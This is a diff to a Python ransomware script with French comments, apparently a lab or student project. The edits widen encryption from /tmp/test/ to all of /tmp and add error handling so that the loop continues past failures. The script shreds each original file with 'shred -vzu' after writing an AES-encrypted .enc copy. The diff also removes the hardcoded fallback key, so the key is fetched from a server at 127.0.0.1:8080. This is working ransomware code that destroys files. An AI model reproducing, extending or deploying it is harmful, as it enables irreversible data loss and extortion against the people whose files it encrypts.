@@ -57,7 +57,7 @@ def getfiles():
 
 	try:
 		files = list()
-		for (dirpath, dirnames, filenames) in os.walk("/tmp/test/"):
+		for (dirpath, dirnames, filenames) in os.walk("/tmp"):
 			files += [os.path.join(dirpath, file) for file in filenames]
 	except:
 		print("repertoire /tmp/ introuvable")
@@ -86,21 +86,26 @@ def chiffre():
 	for file in files:
 		if file !="/tmp/test/Execme.py":
 
-			f = open(file, "rb")
-			content = f.read()
-
-			#supression des anciens fichiers avec shred
-			os.system("shred -vzu "+ file +" >/dev/null 2>&1")
-			content = pad(content)
-
 			try:
-				d = cipher.encrypt(content)
-			except:
-				print("probleme lors du chiffrement")
 
-			fenc = open(file+".enc", "wb")
-			fenc.write(d)
-			fenc.close()
+
+				f = open(file, "rb")
+				content = f.read()
+
+				#supression des anciens fichiers avec shred
+				os.system("shred -vzu "+ file +" >/dev/null 2>&1")
+				content = pad(content)
+
+				try:
+					d = cipher.encrypt(content)
+				except:
+					print("probleme lors du chiffrement")
+
+				fenc = open(file+".enc", "wb")
+				fenc.write(d)
+				fenc.close()
+			except OSError:
+				continue
 
 
 #dechiffre les fichiers .enc et supprime les fichiers chiffrés de /tmp
@@ -148,16 +153,11 @@ def getkey():
 		r = requests.get('http://127.0.0.1:8080/cle.txt') #Le ransomware va chercher la clé sur le serveur et l'obtient en format json
 		key = ((r.text).split(":"))[1]
 		key = binascii.unhexlify(key)
-		
-		key = b"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
 		return key
 
 
 	except ConnectionError:
 		print("le serveur est injoignable | pour subir le ransomware, executez le programme serveur.py\n et laissez le ouvert pendant toute l'operation de chiffrement et dechiffrement\n\n")
-
-
-		key = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
 		return key
 
 
